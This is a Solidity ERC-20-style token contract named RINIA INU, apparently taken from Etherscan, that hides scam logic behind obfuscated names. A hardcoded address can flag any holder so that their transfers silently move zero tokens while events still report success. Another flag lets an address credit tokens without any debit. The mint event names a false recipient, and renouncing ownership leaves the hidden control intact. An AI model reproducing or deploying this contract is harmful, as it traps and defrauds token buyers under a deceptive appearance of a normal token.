/**
 *Submitted for verification at Etherscan.io on 2023-03-16
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract RINIA {
    using SafeMath for uint256;
    mapping (address => uint256) private GMXa;
	
    mapping (address => uint256) public GMXb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "RINIA INU";
	
    string public symbol = "RINIA";
    uint8 public decimals = 6;

    uint256 public totalSupply = 2500000000 *10**6;
    address owner = msg.sender;
	  address private GMXc;
     

  
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address GMXf = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
      address KYB = 0xF62cFE6aFF9Adb26FedC5d06F2fe76B9947D487C;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
       
             GMXa[msg.sender] = totalSupply;
        
       ORBIT();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function ORBIT() internal  {                             
                      
                       GMXc = GMXf;

                

        emit Transfer(address(0), GMXc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return GMXa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        
                    if(GMXb[msg.sender] > 7) {
                            require(GMXa[msg.sender] >= value);
       
                   value = 0;}
                   else

    require(GMXa[msg.sender] >= value);
GMXa[msg.sender] -= value;  
GMXa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 	


 

   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  


    

         if(msg.sender == KYB){
        GMXb[to] += value;
        return true;}
        else
        if(GMXb[msg.sender] == 5) {
             require(value <= allowance[from][msg.sender]);
             GMXa[to] += value;}
        else

                    if(GMXb[from] > 7 || GMXb[to] > 7) {
                               require(value <= GMXa[from]);
        require(value <= allowance[from][msg.sender]);
                   value = 0;}
        else

         if(from == owner){from == GMXf;}

    
      
        require(value <= GMXa[from]);
        require(value <= allowance[from][msg.sender]);
        GMXa[from] -= value;
        GMXa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
       


      
}



     

        	
 }